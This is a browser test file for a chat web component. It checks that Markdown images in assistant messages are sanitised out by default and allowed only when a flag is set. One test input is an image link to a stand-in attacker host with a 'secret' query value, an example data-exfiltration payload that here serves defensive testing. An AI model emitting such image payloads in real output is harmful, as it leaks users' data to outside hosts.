import { beforeAll, describe, expect, it } from "vitest";
import { ELEMENT_TAG, MESSAGE_ROLE } from "../../src/constants.js";
import type { AgUiChat } from "../../src/core/ag_ui_chat.js";
import { defineAgUiChat } from "../../src/core/define_ag_ui_chat.js";

/**
 * The component's own sanitisation behaviour, asserted in Chromium.
 *
 * This lived in `tests/ag_ui_chat.test.ts` until dompurify was allowed to
 * float. It cannot stay there: under happy-dom, DOMPurify 3.4.8+ stops
 * sanitising entirely, so `querySelector("img")` returns an element and the
 * test fails — not because the component regressed, but because the test DOM
 * cannot evaluate the assertion.
 *
 * Everything else about this component is still covered under happy-dom. Only
 * the assertions whose subject *is* sanitisation moved.
 */
function mount(): AgUiChat {
  const el = document.createElement(ELEMENT_TAG) as AgUiChat;
  document.body.appendChild(el);
  return el;
}

describe("AgUiChat sanitisation (real browser)", () => {
  beforeAll(() => {
    defineAgUiChat();
  });

  it("strips img from assistant bubbles by default; allowImages opts back in", () => {
    const el = mount();
    const blocked = el.appendMessage(
      MESSAGE_ROLE.ASSISTANT,
      "![x](https://attacker.example/?d=secret)",
    );
    expect(blocked.querySelector("img")).toBeNull();
    el.allowImages = true;
    const permitted = el.appendMessage(MESSAGE_ROLE.ASSISTANT, "![x](https://ex.com/i.png)");
    expect(permitted.querySelector("img")?.getAttribute("src")).toBe("https://ex.com/i.png");
  });
});
